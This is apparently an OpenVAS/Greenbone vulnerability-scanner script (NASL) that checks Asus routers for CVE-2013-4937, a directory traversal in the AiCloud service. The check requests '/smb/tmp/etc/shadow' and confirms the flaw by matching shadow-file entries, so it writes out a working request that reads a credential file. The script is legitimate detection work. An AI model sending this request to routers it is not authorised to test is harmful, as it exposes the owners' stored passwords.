# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103747");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Multiple Asus Router Directory Traversal Vulnerability");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-06-26 13:46:49 +0200 (Wed, 26 Jun 2013)");
  script_cve_id("CVE-2013-4937");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("RT-Device/banner");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/asus-rt-n66u-directory-traversal");
  script_xref(name:"URL", value:"http://heise.de/-2105778");

  script_tag(name:"summary", value:"The remote Asus router is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Try to read /etc/shadow.");

  script_tag(name:"solution", value:"Turn off AiCloud service.");

  script_tag(name:"affected", value:"Vulnerable Asus Models:

  RT-AC66R   Dual-Band Wireless-AC1750 Gigabit Router

  RT-AC66U   Dual-Band Wireless-AC1750 Gigabit Router

  RT-N66R     Dual-Band Wireless-N900 Gigabit Router with 4-Port Ethernet Switch

  RT-N66U     Dual-Band Wireless-N900 Gigabit Router

  RT-AC56U   Dual-Band Wireless-AC1200 Gigabit Router

  RT-N56R     Dual-Band Wireless-AC1200 Gigabit Router

  RT-N56U     Dual-Band Wireless-AC1200 Gigabit Router

  RT-N14U     Wireless-N300 Cloud Router

  RT-N16       Wireless-N300 Gigabit Router

  RT-N16R     Wireless-N300 Gigabit Router");

  script_tag(name:"impact", value:"Disclosure of cleartext passwords.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"Workaround");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );
banner = http_get_remote_headers( port:port );
if( banner !~ 'Basic realm="RT-' ) exit( 0 );

ssl_port = 443;
if( ! get_port_state( ssl_port ) ) exit( 99 );

url = '/smb/tmp/etc/shadow';
req = http_get( item:url, port:ssl_port );
res = http_send_recv( port:ssl_port, data:req );

if( egrep( pattern:"(nas|admin|nobody):.*:0:[01]:.*:", string:res ) ){
  report = '\n\nBy requesting the URL "/smb/tmp/etc/shadow" we received the following response:\n\n' + res + '\n';
  security_message( port:ssl_port, data:report );
  exit(0);
}

exit( 99 );
